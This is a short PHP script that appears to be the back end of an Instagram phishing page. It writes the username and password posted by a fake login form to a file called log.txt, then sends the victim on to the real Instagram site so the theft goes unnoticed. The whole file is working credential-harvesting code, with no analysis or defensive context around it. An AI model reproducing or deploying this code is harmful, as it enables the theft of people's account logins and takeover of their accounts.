<?php

file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n" );
file_put_contents("log.txt", "Pass: " . $_POST['password'] ,  FILE_APPEND);
header('Location: https://www.instagram.com/');
exit();
?>